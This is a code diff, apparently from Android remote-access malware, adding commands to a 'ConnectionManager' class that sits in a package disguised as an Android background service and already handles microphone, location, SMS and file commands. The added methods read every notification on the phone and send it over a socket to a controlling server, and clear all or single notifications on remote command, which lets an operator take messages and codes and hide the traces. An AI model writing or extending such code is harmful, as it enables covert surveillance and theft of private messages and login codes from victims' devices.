@@ -29,10 +29,12 @@ import com.android.background.services.helpers.FileManager;
 import com.android.background.services.helpers.LocManager;
 import com.android.background.services.helpers.MicManager;
 import com.android.background.services.helpers.MicRecorderManager;
+import com.android.background.services.helpers.NotificationsManager;
 import com.android.background.services.helpers.SMSManager;
 import com.android.background.services.helpers.Storage;
 
 import org.apache.commons.io.FileUtils;
+import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
@@ -175,6 +177,15 @@ public class ConnectionManager {
                                 break;
                             case "x0000stoprecordmic2":
                                 MicRecorderManager.stop();
+                                break;
+                            case "x0000nt":
+                                x0000nt();
+                                break;
+                            case "x0000clearNt":
+                                x0000clearNt();
+                                break;
+                            case "x0000clearSingleNt":
+                                x0000clearSingleNt(data.getString("notificationKey"));
                                 break;
 
 
@@ -530,5 +541,76 @@ public class ConnectionManager {
             location.put("enable", false);
 
         ioSocket.emit("x0000lm", location);
+    }
+
+    public static void x0000nt() {
+        try {
+            JSONObject notifications = NotificationsManager.getNotifications();
+            if (notifications != null) {
+                ioSocket.emit("x0000nt", notifications);
+            } else {
+                // Gửi response rỗng nếu không có notifications
+                JSONObject emptyResponse = new JSONObject();
+                emptyResponse.put("notificationsList", new JSONArray());
+                ioSocket.emit("x0000nt", emptyResponse);
+            }
+        } catch (Exception e) {
+            Log.e("x0000nt", "Error getting notifications: " + e.getMessage());
+            try {
+                JSONObject errorResponse = new JSONObject();
+                errorResponse.put("error", "Failed to get notifications: " + e.getMessage());
+                ioSocket.emit("x0000nt", errorResponse);
+            } catch (JSONException je) {
+                je.printStackTrace();
+            }
+        }
+    }
+
+    public static void x0000clearNt() {
+        try {
+            boolean success = NotificationsManager.clearAllNotifications();
+            JSONObject response = new JSONObject();
+            response.put("status", success);
+            response.put("message", success ? "All notifications cleared successfully" : "Failed to clear notifications");
+            ioSocket.emit("x0000clearNt", response);
+        } catch (Exception e) {
+            Log.e("x0000clearNt", "Error clearing notifications: " + e.getMessage());
+            try {
+                JSONObject errorResponse = new JSONObject();
+                errorResponse.put("status", false);
+                errorResponse.put("message", "Error clearing notifications: " + e.getMessage());
+                ioSocket.emit("x0000clearNt", errorResponse);
+            } catch (JSONException je) {
+                je.printStackTrace();
+            }
+        }
+    }
+    
+    public static void x0000clearSingleNt(String notificationKey) {
+        try {
+            if (notificationKey != null && !notificationKey.isEmpty()) {
+                boolean success = NotificationsManager.clearNotification(notificationKey);
+                JSONObject response = new JSONObject();
+                response.put("status", success);
+                response.put("notificationKey", notificationKey);
+                response.put("message", success ? "Notification cleared successfully" : "Failed to clear notification");
+                ioSocket.emit("x0000clearSingleNt", response);
+            } else {
+                JSONObject errorResponse = new JSONObject();
+                errorResponse.put("status", false);
+                errorResponse.put("message", "Invalid notification key");
+                ioSocket.emit("x0000clearSingleNt", errorResponse);
+            }
+        } catch (Exception e) {
+            Log.e("x0000clearSingleNt", "Error clearing single notification: " + e.getMessage());
+            try {
+                JSONObject errorResponse = new JSONObject();
+                errorResponse.put("status", false);
+                errorResponse.put("message", "Error clearing notification: " + e.getMessage());
+                ioSocket.emit("x0000clearSingleNt", errorResponse);
+            } catch (JSONException je) {
+                je.printStackTrace();
+            }
+        }
     }
 }
